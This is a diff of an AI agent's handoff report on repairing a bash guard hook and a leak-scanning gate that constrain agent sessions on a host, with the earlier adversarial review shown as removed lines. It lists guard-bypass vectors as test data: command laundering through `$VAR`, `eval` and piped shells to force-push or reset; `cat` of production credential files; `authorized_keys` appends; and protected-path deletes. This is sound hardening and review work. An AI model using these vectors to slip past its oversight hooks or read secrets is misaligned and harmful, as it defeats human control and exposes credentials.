@@ -1,394 +1,246 @@
 # CLAUDE OUTBOX — latest handoff only
 
-## 2026-09-19T20:02Z — Independent review of harness candidate `dd50ebb`: REJECT — REPAIR REQUIRED
+## 2026-09-19T21:26Z — Repair round for rejected harness candidate `dd50ebb`: new candidate `d7911b2` pushed
 
-**Inbox consumed:** yes. Blob SHA processed: `2b1030bd48ee14888e0c85b7d160fa39b2cba6eb`
-(`bridge/chatgpt-inbox.md`, heading "2026-09-19 — Independent review of isolated harness candidate").
-These instructions are now recorded as executed and must not be run again.
+**Inbox consumed:** yes. Blob SHA processed: `4843e76fb5523a4486c1d275f67842d3ab567ef3`
+(`bridge/chatgpt-inbox.md`, heading "2026-09-19 — Repair rejected harness candidate after
+independent review"). These instructions are now recorded as executed and must not be run again.
 
-**Verdict: `REJECT — REPAIR REQUIRED`.** Candidate `dd50ebbca6eca9c4e2ee1e85ad17d2c7e5afd25e` on
-`claude/harness-hooks-experiment` is exactly one commit ahead of the accepted base
-`295e483b4f9adcdc3fb58bfb3aa025e2e3f4779b`, its tests and scans reproduce exactly as the implementer
-reported, its fail-closed *input* contract holds (4,000-input fuzz, zero exceptions), and its docs are
-honest about what is not active. But the committed hooks are not sound against the criteria the inbox set:
-my own vectors — none of them in the implementer's tables — found (a) a secret-leak path through the guard
-to the real production credential files on this host, (b) a false allow of a mutation on the production
-checkout, (c) trivial command laundering (`eval`, `$VAR`, `printf … | sh`, `cat <<EOF | bash`) that blinds
-**both** hooks, and (d) a fail-open exception path contrary to the stated contract. All are bounded repairs
-on the same branch; none is a design rejection. Defect list in §5. Nothing was implemented, nothing was
-written to the candidate or the builder, and no `.claude/` file exists anywhere.
+**Result.** Exactly one new commit on `claude/harness-hooks-experiment`, on top of the rejected
+candidate, pushed and read back from the remote:
 
-**The harness is not accepted and not active.** `.claude/settings.json`, `.claude/rules/*` and the vendored
-skill remain refused/pending; no hook runs in any session. No owner approval is inferred for anything.
+| | SHA |
+|---|---|
+| **New candidate (this round)** | `d7911b24979be2306749b7333ec60edc28cba857` |
+| Parent = rejected candidate | `dd50ebbca6eca9c4e2ee1e85ad17d2c7e5afd25e` |
+| Accepted Builder base | `295e483b4f9adcdc3fb58bfb3aa025e2e3f4779b` |
+| Remote `refs/heads/claude/harness-hooks-experiment` (`git ls-remote` after push) | `d7911b24979be2306749b7333ec60edc28cba857` |
+
+`git rev-list --left-right --count 295e483…...d7911b2…` → `0 2`; `d7911b2^` = `dd50ebb…`;
+merge-base with the rejected candidate = `dd50ebb…`. Author `Claude <noreply@anthropic.com>`,
+2026-09-19 21:25:34 UTC. 8 files, +1869/−242. Not merged, not deployed, nothing under `.claude/`
+written. **This is a review candidate. It is not accepted, and no hook is active anywhere: the
+`.claude/settings.json` that would register the hooks is still the owner's pending apply step.**
+No owner approval is inferred for anything.
+
+**Recommendation: a fresh independent adversarial review of `d7911b2…`**, base `dd50ebb…`,
+with the same read-only contract as the review of inbox `2b1030bd…`. This round does not
+certify its own work (pilot §5).
 
 ---
 
 ## 1. What was asked
 
-Adversarial, read-only, independent review of `claude/harness-hooks-experiment` at exact head
-`dd50ebbca6eca9c4e2ee1e85ad17d2c7e5afd25e`, exact base `295e483b…`: verify identity; attack `guard_bash.py`
-(parser/quoting/wrapper/separator/redirection/path/ref bypasses, false allows, dangerous false positives,
-secret leakage, env bypasses, fail-open), `gitleaks_gate.py`, `roster_assert.py` + the isolation doc,
-`.gitignore` / root `CLAUDE.md` / `PROJECT_CLAUDE_FILES_PENDING.md`; re-run targeted tests, the offline
-suite, Ruff and a secret scan on the exact candidate; assess the `.worktrees/` consequence; assess the
-1,340-line guard against the reuse plan's "small guard" preference; confirm no production/global/account/
-connector/secret/service/Tailscale/business change. Return exactly one verdict. No fixes, no new candidate.
+One bounded repair round for the independently rejected candidate: repair D-01…D-12, D-15…D-18,
+D-20, the stale root `CLAUDE.md` test count, and record D-14 and D-13/D-19 dispositions; one
+negative test per defect using the review's vectors with failing-before/passing-after evidence;
+re-run targeted tests, full offline suite, Ruff and gitleaks; exact identity; clean worktree;
+push and read back; do not remove/relocate the worktree, do not touch the local exclude entry or
+the watcher unit, no `.claude/` writes, no account/global/connector/identity changes, no merge, no
+self-certification. Repository is now `crooksldn-pixel/clive`; fetch fresh refs.
 
 ## 2. Checkout state — start and end
 
-| Repo | Branch | HEAD | Start | End |
-|---|---|---|---|---|
-| Builder `/opt/crooks-builder` | `claude/builder-environment-repair` (unit still says `claude/bridge-builder`; untouched) | `295e483b…` | clean (`--untracked-files=all`) | clean, unchanged. Note: clean only because `.git/info/exclude` now contains `.worktrees/` — see §5 D-14 |
-| Candidate worktree `/opt/crooks-builder/.worktrees/harness-hooks-experiment` | `claude/harness-hooks-experiment` | `dd50ebb…` | clean | clean, unchanged; origin still `dd50ebb…` (`git ls-remote`) |
-| Bridge `/opt/crooks-ai-bridge` | `crooks-ai-bridge` | `d54b1422…` | clean | only `bridge/claude-outbox.md` modified (this file) |
-| Production `/opt/crooks-os` (read-only) | `claude/linux-prod-migration-production` | `1cf3a0f3…` | clean | clean, untouched |
+| Repo | Branch | Start | End |
+|---|---|---|---|
+| Builder `/opt/crooks-builder` | `claude/builder-environment-repair` (unit env still says `claude/bridge-builder`; untouched) | `295e483b…`, clean (`--untracked-files=all`, 0 lines) | unchanged, clean. `.git/info/exclude` still ends with the owner's `.worktrees/` line — **not touched** |
+| Candidate worktree `/opt/crooks-builder/.worktrees/harness-hooks-experiment` | `claude/harness-hooks-experiment` | `dd50ebb…`, clean | **`d7911b2…`**, clean (0 status lines); not moved, not removed |
+| Bridge `/opt/crooks-ai-bridge` | `crooks-ai-bridge` | `f1055c3f…`, clean | only `bridge/claude-outbox.md` modified (this file) |
+| Production `/opt/crooks-os` (read-only, `git rev-parse`/`status` only) | `claude/linux-prod-migration-production` | `1cf3a0f3…`, clean | `1cf3a0f3…`, clean, never entered for anything else |
 
-Canonical truth was read fresh at the remote tip `59c5f677cbe96bfa64c1ddedeaf2c9e545e75889` via
-`git fetch` → `FETCH_HEAD` and `git show` (the builder's local tracking ref `origin/claude/product-memory-foundation`
-is stale at `b5c94fd8…`, which does not even contain CURRENT_TRUTH — a future round must not trust that ref).
-Read: CURRENT_TRUTH, DECISIONS DEC-048/DEC-049, ENGINEERING_STACK_REUSE_PLAN (§"REIMPLEMENT, DO NOT IMPORT
-… as a **small** fail-closed CROOKS project hook"; "start with a small typed decision table and exhaustive
-negative tests"; item 2 of the plan: "must separately specify/prove how production/business MCP exposure
-will be removed before unattended worker operation"), ENGINEERING_ORCHESTRATOR_V1 (§8 workspace/credential
-isolation; safety contract "engineering permission never grants business-action permission"),
-DEV_TEAM_V1_PILOT (§5 independent review contract; corrections create a new candidate). The preceding
-outbox (inbox `83ead96b…`) was read from the bridge branch as the implementer's evidence.
+Fresh refs: `git fetch --all` **fails** in the builder (`fatal: couldn't find remote ref
+refs/heads/claude/bridge-builder` — its only fetch refspec names a branch that no longer exists on
+`crooksldn-pixel/clive`), so branches were fetched explicitly: `claude/product-memory-foundation`
+at `052a27d496845a4c8b8eddb5c32685a3892b6a72` (the inbox's stated head — confirmed on the remote),
+`claude/harness-hooks-experiment` at `dd50ebb…`, `claude/builder-environment-repair-review` at
+`295e483…`. Canonical truth read at `052a27d…` by `git show`: CURRENT_TRUTH (rename complete,
+harness review verdict, D-14 incident and durable lesson, DEC-049 scope), DECISIONS DEC-048/049,
+DEV_TEAM_V1_PILOT §5. The review outbox (inbox `2b1030bd…`) was read from bridge commit `dfe7028`
+and its exact vectors are the tests. Note for future rounds: the stale refspec is a builder-clone
+configuration fact, not something this round changed.
 
-## 3. Identity — verified (inbox item 1)
+## 3. What was found (the review's defects, reproduced)
 
-- `git rev-list --left-right --count 295e483b…...dd50ebb…` → `0 1`; `dd50ebb^` = `295e483b…`;
-  merge-base = `295e483b…`; branch tip local = origin = `dd50ebb…`.
-- One commit, author `Claude <noreply@anthropic.com>`, 2026-09-19 17:34:35 UTC, "The harness experiment,
-  minus the .claude/ files its permission layer refused". 13 files, +3149/−26, exactly as reported.
-- No `.claude/` directory exists in the candidate worktree or the builder (`ls -la` both: absent).
+Before touching source, the new test file `tests/test_harness_review_repairs.py` (the review's
+command strings, one section per defect) was run against the rejected source at `dd50ebb…`:
+**162 failed, 18 passed** of 180. The 18 passes are the "still allowed" halves and a few vectors
+the rejected code already caught (`cp x /opt/crooks-os/{a..c}`, `cd …; cd ..; git pull`,
+`pushd/popd`, `export -p`, `cat < crooks-assistant/.env`, `rm -rf /root/.cache/x`). Every H defect
+reproduced exactly as the review stated.
 
-## 4. Evidence re-run on the exact candidate (inbox item 6)
+**Found while repairing, not in the review:** `_protected_hit` matched a glob whose literal prefix
+sat *above* a protected root (`/opt/*`) but never one whose prefix sat *under* it, so
+`cp x /opt/crooks-os/*`, `echo x > /etc/systemd/system/*.service` and
+`tee /opt/crooks-os/crooks-assistant/config/*.py` were **ALLOW** on `dd50ebb…` (verified against
+the rejected guard after the fact: all ALLOW). Fixed and tested
+(`test_found_during_repair_a_glob_under_a_protected_root_is_inside_it`).
 
-All from the worktree's `crooks-assistant/`, using the base builder's gitignored `.venv` by absolute path
-(the worktree has no `.venv`/`.tooling`); `import app` confirmed to resolve to the **worktree's** copy.
+## 4. What changed — per defect
+
+All in one commit, `d7911b2…`. File-level: `scripts/hooks/guard_bash.py` (1340 → 2024 lines),
+`scripts/hooks/gitleaks_gate.py` (194 → 258), `scripts/roster_assert.py` (146 → 209),
+`tests/test_harness_review_repairs.py` (new, 715 lines, 181 tests), root `CLAUDE.md`,
+`docs/DEV_ENVIRONMENT.md`, `docs/dev-environment/WORKER_TOOL_SURFACE_ISOLATION.md`,
+`docs/dev-environment/PROJECT_CLAUDE_FILES_PENDING.md`. No other file. The lexer, input contract,
+ported ECC table and every existing rule id are unchanged; new rule ids are `NESTED-CLAUDE-SESSION`,
+`PROJECT-CLAUDE-WRITE`, `GIT-HOOKS-WRITE`, `GIT-CONFIG-EXEC`, `INTERPRETER-SECRET-READ`,
+`NETWORK-MUTATION`, `PUBLIC-BIND`, `INTERNAL-ERROR` (stderr only).
+
+| Defect | Repair (in `guard_bash.py` unless stated) | Evidence (test name / vectors) |
+|---|---|---|
+| **D-01 H** | `SECRET_DIRS = (/etc/crooks-os/credentials, /etc/crooks-os/secrets)`; any token or assignment value reaching either, in any command (reads, `ls`, `cd`, `cp`, `tar`, globs one level up) → `SECRET-FILE-READ`. `SECRET_FILE_RE` gains `.*\.cred`, `.*signing_key`. Values never opened. | `test_d01_*` — the review's four vectors plus six more; `ls -la /etc/crooks-os` still allowed |
+| **D-02 H** | `_git_read_only("stash", [])` → False; bare `git stash` gets irreversibility context in the builder | `test_d02_*`: `git -C /opt/crooks-os stash` → PROTECTED-PATH; `cd /opt/crooks-os && git stash` → PROTECTED-CWD |
+| **D-03 H** | Command word containing `$`, backtick, `{`, `*`, `?`, `[` (except `[`/`[[`) → `UNPARSEABLE`, checked at every unwrap step (sudo/timeout/xargs/find -exec too). The segmenter marks a command whose word is produced by `$(…)`/backtick (`$SUBST` marker; the substitution body is still evaluated on its own). `eval`, `watch`, `su -c`, `env -S` are shell strings: evaluated when literal, refused when they carry `$`/backtick. | `test_d03_*`: all seven review vectors + `$(echo git) push`, `` `echo git` push ``, `{git,x} push`, `/usr/bin/gi? push`, `env -S`, `watch`, `su -c`; `echo y \| $(rm -rf /tmp)` still RM-RECURSIVE |
+| **D-04 H** | `_shell_texts`: a shell's `-c` string, `<<<` operand, heredoc (already evaluated) and script positional are enumerated; a shell that is piped, bare, `-s`, `-`, `< file` or `<(…)` is refused unless the pipe's left side is a literal `echo`/`printf` (no `$`, backtick, backslash, `%`, `-e`) whose text is then evaluated. Same for an interpreter reading stdin. `_heredoc_owner` reads the whole line. | `test_d04_*`: all six review vectors + 16 more; `bash script.sh`, `sh <<'EOF'`, `echo 'ls' \| sh`, `cat data \| python3 script.py` still allowed |
+| **D-05 M** | `_tokens` returns the dropped assignments; `env NAME=value` collected too; a value reaching a protected path denies unless the command is read-only; `GIT_DIR`/`GIT_WORK_TREE`/`GIT_COMMON_DIR`/`GIT_INDEX_FILE`/`GIT_OBJECT_DIRECTORY` are git global-option paths (read-only git still passes). | `test_d05_*`: both review vectors + 5 |
+| **D-06 M** | `_git_subcommand` now returns a `_GitCall` with `-c`/`--config-env` values; `core.hookspath` → `GIT-CONFIG-HOOKSPATH`; keys whose value is a command git runs (`core.fsmonitor`, `core.sshCommand`, `core.pager`, `core.editor`, `credential.*`, `alias.*`, `filter.*`, `diff.external`, …) → `GIT-CONFIG-EXEC`, for `-c` and for `git config` writes. `git config --get core.hooksPath` is a read again (review false positive). | `test_d06_*` |
+| **D-07 M** | `_claude_rule` is an allow-list: `--version/-v/--help/-h/doctor` and read-only `mcp list/get`, `plugin list`, `config get/list/ls`; every other invocation → `NESTED-CLAUDE-SESSION` (covers `-p`, `--print`, `--permission-mode`, `--bare`, `--mcp-config`, `--setting-sources`, `--plugin-dir`, bare `claude`, a prompt). | `test_d07_*`: the review's four vectors + 6 |
+| **D-08 M** | Any token with a `.claude` path component, or `.git/hooks`, in any spelling: redirect target, cp/rsync/install destination, or argument of a non-read-only command → `PROJECT-CLAUDE-WRITE` / `GIT-HOOKS-WRITE`; `rm -rf .claude` → RM-RECURSIVE. Reads, `git add/commit/diff/status/reset` of those paths stay allowed. | `test_d08_*`: the review's four vectors + 12 |
+| **D-09 M** | curl short-option bundles parsed with value-taking letters (`-XPOST`, `-sSXPOST`, `-d'{}'`, `-sS -XDELETE`); package verb = first non-dash token, pacman-style short verbs still matched; systemctl verb found past value-taking options (`-n 5 status` — review false positive). | `test_d09_*` |
+| **D-10 bounded** | Brace forms expanded per alternative (`_brace_alternatives`; sequences/nesting → unknown → checked by literal prefix); `//opt/x`, `~root`, `-o/opt/x` spellings; working directory tracked from the payload `cwd` through absolute, home, relative and `-` targets (`_cd_rule`), `cd -` into the unknown → UNPARSEABLE; relative recursive-delete targets resolved against the tracked cwd (`cd /opt; rm -rf crooks-os`); `{}` unknown outside a `find -exec` scope; worktrees under `.worktrees/` are checkout roots of their own. Symlink-through-parent is recorded as a limit in the guard docstring, not solved. | `test_d10_*`: 19 deny vectors + 11 allowed forms |
+| **D-11 M** | `main()` in both hooks wraps everything in `try/except BaseException` → one fixed line (`… DENY [INTERNAL-ERROR] …`), exit 2, nothing on stdout. | `test_d11_*` (monkeypatched `decide`/`run_gate` raising; the sentinel never appears) |
+| **D-12 bounded** | `printf` and embedded/sliced credential-variable references (`"token=$X"`, `${X:0:8}`, `${X#…}`); `<<<` operands; `/proc/<pid>/environ`; `declare/typeset/export -x/-p`; inline interpreter code that reads the environment or a credential file (`os.environ`, `getenv`, `process.env`, `$ENV`, `.env`, `.credentials`, `/proc/`, …) → `INTERPRETER-SECRET-READ`, for `-c` and code heredocs; dot-prefixed globs (`.en?`, `.env*`); `< .env` input redirects. | `test_d12_*`: 22 deny vectors + 11 allowed |
+| **D-13 (scope decision)** | The general conservative rule was implemented because it is two constants, not a policy surface: `/etc` and `/root` appended to `PROTECTED_DIRS` (specific roots stay first so reasons keep naming them). Writes, deletes, `cd`-then-mutate under either are denied; reads stay. Plus one line each: `systemd-run`/`at`/`batch` → SERVICE-MUTATION; `ufw`/`iptables`/`ip6tables`/`nft`/`firewall-cmd` mutating verbs → NETWORK-MUTATION; any `0.0.0.0`/`[::]` bind → PUBLIC-BIND; `git push --all` → GIT-PUSH-PROTECTED-REF. **Deferred, documented:** `kill`/`pkill` of the production process (legitimately used to stop test processes), `docker`, `socat`, `python -m pip install --user`, and a finite command-word allow-list. | `test_d13_*`: 16 deny vectors + 11 allowed (`cat /root/.bashrc`, `cp /etc/hosts /tmp/`, loopback binds, `ufw status`, `iptables -L`) |
+| **D-15 M→H** (`gitleaks_gate.py`) | `_publish_actions` walks a queue of command texts: `-c` strings, `<<<` operands, `eval`/`watch`/`su -c`/`env -S` strings and literal `echo … \| sh` text via the guard's shared `_shell_texts`/`_dynamic_word`; a laundered form the guard refuses raises → `UNPARSEABLE` deny in the gate too. | `test_d15_*`: `bash -c 'git push'`, `eval`, `<<<`, `printf \| sh`, heredoc `\| bash`, `env -S`, `timeout … bash -c` all found; six laundered forms denied |
+| **D-16 L** | `_GitCall.chdir` is the last `-C` **before** the subcommand only; `git commit -C HEAD` scans the real repo (verified in a temp repo with the pinned binary). | `test_d16_*` |
+| **D-17 M** | `TOTAL_SCAN_BUDGET_S = 100`, one `deadline` per `run_gate` call shared by every scan; each scan's `timeout` is what remains; an exhausted budget denies without starting a scan. Registered timeout stays 120 s; the pending `settings.json` text is **unchanged** and the test asserts the budget sits below it. | `test_d17_*` (fake clock: two scans get 90 s then 40 s of a 100 s budget) |
+| **D-18 M** (`roster_assert.py`) | Documented key set; `agents`/`skills`/`plugins` are surfaces that must be empty unless explicitly allowed; **any undocumented list- or object-valued key is a violation**; undocumented scalars are reported as `unknown_keys`; digest covers `slash_commands` and every surface; `ToolSearch` and `Skill` added to the disallowed built-ins. | `test_d18_*` (5 tests); existing `test_roster_assert.py` unchanged and passing |
+| **D-19** | No code claim. Isolation doc §3 now states in its own paragraph that layer-1 isolation is **not proven**: deferred tools behind `ToolSearch`, and whether `--disallowed-tools` removes or only denies, are empirical questions for an owner-approved live capture. No account, global Claude, connector, MCP, identity, credential or launch-flag change was made. | doc only |
+| **D-20 L** | Isolation doc §4 and the module docstring: "a kill switch, not the gate"; the launch configuration is the gate; the token-zero guarantee is withdrawn. | doc only |
+| Item 18 | Root `CLAUDE.md`: "~2800 tests" removed (no number). | `test_root_claude_md_is_short_…` still passes (49 lines < 60) |
+| Item 19 / **D-14** | `DEV_ENVIRONMENT.md` §11 records the incident (eight watcher refusals, unprocessed inbox), the owner-side `.git/info/exclude` entry as a **temporary operational workaround, not architecture**, that the tracked `.gitignore` line is the durable form, that the entry must not be touched by a worker, and why worker workspaces stay under the builder until the watcher unit (`ReadWritePaths=/opt/crooks-builder` under `ProtectSystem=strict`) is separately hardened. Worktree not moved; exclude entry not touched; unit not touched. | doc only |
+
+**One documented behaviour change the reviewer should weigh.** D-03 refuses `eval` of a
+substitution, which includes the repository's documented idiom
+`eval "$(python3 scripts/dev_env.py env)"`. Rather than special-case one command in a security
+repair, `CLAUDE.md` and `DEV_ENVIRONMENT.md` now show
+`python3 scripts/dev_env.py env > /tmp/crooks-env.sh && . /tmp/crooks-env.sh` (the guard can name
+the file; sourcing a file is the same documented "script file" limit as `bash script.sh`).
+`scripts/dev_env.py` itself still *prints* the `eval` hint (lines 9, 202, 626) — it is output, not
+a command the guard sees, and changing product-script text was outside this round's scope; noted in
+the doc.
+
+**Size.** The guard grew from 1,340 to 2,024 lines (≈60 of them the new "Known limits" docstring).
+The inbox said to shrink only "without reducing the proved safety contract" and not to refactor for
+line count during a security repair; each repair added parsing (shell texts, brace expansion, cwd
+tracking, curl bundles) rather than removing any. The reviewer's §5F suggestion — split the
+`gh`/package/disk/keyring/network families into an advisory table and make the command-word rule a
+finite allow-list — is a design decision for a separate round; unknown *static* command words are
+still allowed, and the docstring says so.
+
+## 5. Evidence — all measured on the exact tree of `d7911b2…` (working tree identical; 0 status lines)
+
+From the worktree's `crooks-assistant/`, base builder's `.venv` and pinned tooling by absolute
+path (the worktree has neither; `import app` resolves to the worktree copy).
 
 | Check | Result |
 |---|---|
-| Targeted: `pytest tests/test_guard_bash.py tests/test_gitleaks_gate.py tests/test_roster_assert.py tests/test_project_claude_layout.py tests/test_dev_env.py -q -p no:cacheprovider -rs` | **387 passed, 2 skipped**, 20.6 s. The two skips print their reasons: ".claude/settings.json is not present — pending the owner's apply step … this skip proves nothing" and "vendored skill not present — … this skip proves nothing". **They are skips, not passes; confirmed.** |
-| Offline suite: `pytest -m "not live" -q -p no:cacheprovider -n 4` | **3193 passed, 10 skipped, exit 0**, 227.7 s — identical to the implementer's count. Two "Exception ignored … RuntimeError: Event loop is closed" tracebacks appear at xdist worker teardown; they are interpreter-shutdown noise from asyncio subprocess transports, not test failures, and the candidate adds no async code. Not attributed to the candidate; not previously recorded. |
-| `ruff check app config scripts tests` (= `make lint`), ruff 0.16.8 | All checks passed |
-| `gitleaks git --redact --log-opts=295e483b…..dd50ebb…` (pinned 8.30.1, stdout/stderr to /dev/null, JSON report read for counts only, then deleted) | **0 findings** |
-| Reviewer fuzz: 4,000 random/mutated command strings through `evaluate()` and `decide()` | **0 exceptions** |
-| Reviewer adversarial vectors (≈200, listed in `/tmp/guard_probe.py` — in the watcher's PrivateTmp, so gone after the service restarts; the decisive ones are quoted in §5) | see §5 |
+| **Failing-before** (new test file vs rejected source `dd50ebb…`) | `pytest tests/test_harness_review_repairs.py` → **162 failed, 18 passed** (180). The later-added glob test's six vectors were run against the rejected guard afterwards: all six ALLOW. |
+| **Passing-after** (same file, repaired source) | **181 passed, 0 failed, 0 skipped** |
+| Targeted: `pytest tests/test_harness_review_repairs.py tests/test_guard_bash.py tests/test_gitleaks_gate.py tests/test_roster_assert.py tests/test_project_claude_layout.py tests/test_dev_env.py -q -p no:cacheprovider -rs` | **568 passed, 2 skipped**, 22.8 s. The 2 skips are the same two layout tests as before (`.claude/settings.json` absent; vendored skill absent) and print their reasons — **skips, not passes**. Every pre-existing test (387) passes unchanged: all ECC ported vectors, all CROOKS vectors, the stdin-only/stdlib-only source checks. |
+| Full offline suite: `pytest -m "not live" -q -p no:cacheprovider -n 4` | **3374 passed, 10 skipped, exit 0**, 244.1 s (= previous 3193 + 181 new). Same two "Event loop is closed" xdist-teardown tracebacks the reviewer recorded; not failures. |
+| `ruff check app config scripts tests` (= `make lint`, ruff 0.16.8) | All checks passed |
+| `gitleaks git --redact --log-opts=dd50ebb…..d7911b2…` (pinned 8.30.1, stdout/stderr discarded, JSON report read for the count only, deleted) | **0 findings** ("no leaks found") |
+| `gitleaks dir` on each of the 8 changed files individually (copied alone into a temp dir, redacted) | **0 findings in every file**. (A first `dir` scan given several paths walked the whole tree and reported 7 findings, all in pre-existing test fixtures and `__pycache__` on the base branch — `tests/test_scribe.py`, `test_tts.py`, `test_observability*.py`, the synthetic `ghp_` token of `test_gitleaks_gate.py` — none in a changed file. Rule/file/line only were read.) |
+| Fuzz: 6,000 random/mutated command strings × `evaluate`, `decide`, `run_gate` (18,000 calls) | **0 exceptions** |
+| False-positive probe: 83 ordinary engineering commands from this round's own transcript (fetch/show/diff/pytest/ruff/systemctl cat/ss/stat/journalctl/worktree add/commit/push/heredocs/find -exec/xargs/gh view/curl download/…) | **2 denied**: `eval "$(python3 scripts/dev_env.py env)"` (D-03, by design, documented above) and `env \| grep -i crooks_` (bare `env`, pre-existing rule). Everything else allowed. |
+| Hooks under the system `/usr/bin/python3` 3.12.3 (what the pending `settings.json` invokes), as subprocesses on real JSON | guard: `git status` exit 0 silent; `git reset --hard` exit 2 `[GIT-RESET-HARD]`; `eval "$(…)"` exit 2 `[UNPARSEABLE]`; `printf %s "$SHOPIFY_TOKEN"` exit 2 `[SECRET-ECHO]`. gate: `git status` exit 0; garbage → exit 2 `[MALFORMED-INPUT]`. |
+| Identity | one commit, parent `dd50ebb…`, 8 files, `+1869/−242`; local = remote = `d7911b2…` |
 
-Not done: no ECC fetch (the ECC file digests cited in the docstrings/tests were **not** independently
-re-verified in this round — the implementer's and audit's digests agree with each other, nothing more);
-no Claude session launched; no browser; no `.claude/` file created; nothing executed from the candidate
-other than its hooks/tests in-process and as subprocesses on synthetic JSON.
+Not done: no ECC fetch (digests not re-verified — unchanged from the candidate); no Claude session
+launched; no browser; no `.claude/` file; nothing executed from the candidate except its hooks/tests
+in-process and as subprocesses on synthetic JSON and throwaway `tmp_path` repos.
 
-## 5. Findings
+## 6. Production, services, account, connectors — unchanged
 
-Severity: **H** = defeats the hook's own stated contract on a real target on this host or allows a
-production/shared-state mutation; **M** = bypass or fail-open of a stated rule with lower reach; **L** =
-gap or false positive worth a line. "Repair" is the smallest bounded change; each repair is one function
-or one constant and each needs one negative test, per the reuse plan's "exhaustive negative tests".
+**Production branch HEAD: `1cf3a0f3361b79f9de208d80f501543c53c244b5` — unchanged, clean (0
+status lines), never entered except `git rev-parse`/`status`.** `crooks-assistant.service`,
+`crooks-bridge-watcher.service`, `tailscaled.service`: active (read-only `is-active`). Listener
+`127.0.0.1:8000` only (`ss -ltn`); nothing on `0.0.0.0:8000`. `/health` not called.
+`/root/.claude/settings.json` mtime 2026-09-18 16:29 (unchanged); `/root/.claude` writable and used
+only for this session's own memory notes under `/root/.claude/projects/-opt-crooks-builder/memory/`
+(two project-fact files + index: worktree tooling paths and bridge-round facts; no secrets).
+`/opt/crooks-builder/.git/info/exclude` unchanged. Watcher unit unchanged (`systemctl cat` read
+only). No `claude config/mcp/plugin`, no unit, Tailscale, secret, permission, connector or
+business-tool call. Network use: `git ls-remote` (×3), explicit `git fetch` of three branches,
+one `git push --dry-run` (authentication probe; "Everything up-to-date"), one real `git push` of
+`claude/harness-hooks-experiment` only. Scratch under the watcher's `PrivateTmp` (`/tmp/repairs-before.txt`,
+`/tmp/repair-suite.log`, gitleaks reports since deleted) vanishes on restart; nothing is relied on.
 
-### 5A `guard_bash.py` (inbox item 2)
+## 7. Safety constraints — all preserved
 
-**D-01 (H) Production credential files are readable through the guard.** `PROTECTED_DIRS` are
-read-only by design and `cat` is in `READ_ONLY_COMMANDS`; `SECRET_FILE_RE` matches `.env`, `*.pem`,
-`*.key`, `credentials.json` … but not the names actually present on this host. Verified names only (never
-contents): `/etc/crooks-os/credentials/{elevenlabs_api_key,shopify_client_id,shopify_client_secret}.cred`
-and `/etc/crooks-os/secrets/media_signing_key`. Verdicts: `cat /etc/crooks-os/credentials/shopify_client_secret.cred`
-→ **ALLOW**; `cat /etc/crooks-os/credentials/*.cred` → **ALLOW**; `cat /etc/crooks-os/secrets/media_signing_key`
-→ **ALLOW**; `head -c 40 …elevenlabs_api_key.cred` → **ALLOW**. This is exactly the "reading a credential file
-into the transcript" case the `SECRET-FILE-READ` rule exists for, against the live secret store.
-*Repair:* add `SECRET_DIRS = ("/etc/crooks-os/credentials", "/etc/crooks-os/secrets")` and deny **any**
-command naming a path under them (reads included), plus `\.cred$` and `.*signing_key$` in `SECRET_FILE_RE`.
+`writes_enabled` false; `CROOKS_WRITES_LOCAL_OWNER` false; FastAPI on 127.0.0.1; port 8000 not
+public; proposal/action/verification semantics untouched (no `app/` code changed); no live Shopify,
+Gmail or ElevenLabs call; no external mutation other than the one branch push; V2 not begun; UI
+untouched; Mac deployment/rollback untouched; `/root/.claude` writable; no secret value read,
+printed or committed (credential file **names** appear in D-01 tests because refusing them is the
+point; their contents were never opened; the gitleaks synthetic token is the existing test
+fixture, not a credential); nothing installed, started, merged, reset, cleaned, stashed, amended or
+deleted; no `.claude/` file created; worktree not moved; exclude entry and watcher unit untouched;
+no permission widened; nothing outside `bridge/claude-outbox.md` touched in the bridge.
 
-**D-02 (H) Bare `git stash` is classified read-only, so `git -C /opt/crooks-os stash` is allowed.**
-`_git_read_only("stash", [])` returns `not rest or rest[0] in ("list","show")` → `True` for `[]`, but bare
-`git stash` is `stash push`: it rewrites the working tree and adds a ref. Verified: `git -C /opt/crooks-os stash`
-→ **ALLOW**, while `… stash push` / `… stash pop` → DENY `PROTECTED-PATH`. In the builder, bare `git stash`
-also gets no irreversibility context. *Repair:* `return rest[:1] in (["list"], ["show"])`.
+## 8. Errors, corrections made during the round, and limits
 
-**D-03 (H) Command-word laundering is not fail-closed.** The guard allows any command word it does not
-recognise, and `_tokens` silently drops leading `NAME=value` words without inspecting them. Verified ALLOW:
-`G=git; $G push --force origin main`; `G=git; ${G} push --force origin main`; `S=systemctl; $S restart crooks-assistant`;
-`eval 'git push --force origin main'`; `eval "git reset --hard"`; `$'git' push --force origin main`;
-`$'\x67it' push --force origin main`. (The path rule still catches `R=rm; $R -rf /opt/crooks-os` because the
-argument names a protected path — the ref/service/git rules have no such backstop.) *Repair:* in
-`_evaluate_tokens`, deny `UNPARSEABLE` when the command word contains `$` or starts with `$'`, and treat
-`eval` as a shell (`_shell_dash_c` on its joined arguments; deny if any argument contains `$`).
+- **Introduced and caught before commit:** merging the guard's two redirect loops let a bare
+  `>>` match the attached-form regex with a target of `>`, so `echo x >> ~/.ssh/authorized_keys`
+  was ALLOW for one iteration; the D-13 tests caught it, the alternation was reordered and the
+  attached form now requires a non-operator first character; a regression test pins both bare
+  and attached `>>`, `2>>`, `&>>`.
+- **Test expectation corrected:** the review's "deny `cd -` when ambiguous" was first written as
+  `cd /tmp; cd -; cd -; cd -` which is *not* ambiguous when the payload cwd is known; replaced by
+  `cd $X; cd /tmp; cd -; cd -` (returning into an unknown directory), which is.
+- **Tooling:** `gitleaks dir` with several paths walked the tree (see §5); per-file scans are the
+  evidence. `git fetch --all` fails on the builder's stale refspec (§2); not changed.
+- **Behaviour changes a reviewer may judge too strict:** `/root` and `/etc` are now
+  write-protected as a whole (D-13): `rm -rf ~/.cache/x`, `mkdir -p /root/.config/x`, `cd /root &&
+  git clone …` are denied; a session whose payload `cwd` is under `/root` would have every
+  non-read-only command denied (the watcher launches in `/opt/crooks-builder`, so this does not
+  arise here). `$VAR/bin/python` as a command word is denied (write the path). `eval "$(…)"` is
+  denied (§4). `cat <<EOF | tee x | bash` is denied even with a benign body (the shell is fed by
+  `tee`, not by the heredoc directly).
+- **Not solved, recorded in the guard's "Known limits" docstring:** symlink/bind-mount aliasing;
+  script files (`bash x.sh`, `source x.sh`, `python x.py`, `make` targets) beyond a
+  protected-path check; unknown *static* command words allowed; variables inside paths beyond
+  same-line assignments (`> $OUT`); `PATH=` hijack; interpreter code beyond the substrings it
+  names (`os.system(...)` inside `python3 -c` is not seen).
